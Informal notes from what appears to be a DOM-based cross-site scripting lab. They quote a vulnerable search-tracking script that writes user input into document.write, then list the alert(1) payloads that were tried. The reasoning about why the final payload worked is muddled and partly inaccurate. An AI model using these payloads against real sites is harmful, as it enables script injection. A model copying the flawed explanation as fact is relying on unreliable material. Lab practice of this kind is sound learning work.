intially trying:
document.write(<script>alert(1)</script>)

this however is interpreted in the DOM as:
'document.write(&lt;script&gt;alert(1)&lt;/script&gt;)'

they prpobably have a piece of code to strip the <> characters 
and replace them as "&lt" and "&gt"

we need to brake out of the sanitisation of the input box

this seems to be the input box code:
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>

it is then used here in this script tag:
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
        }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>

Next i will try send an object to the input box using:
document.write(["night", "day"]);

Using this solved the lab:
URLSearchParams(window.location.search).get('document.write(<script>alert(1)</script>)')

this is due to the breaking out of the quotes for the <script> tag to be enabled
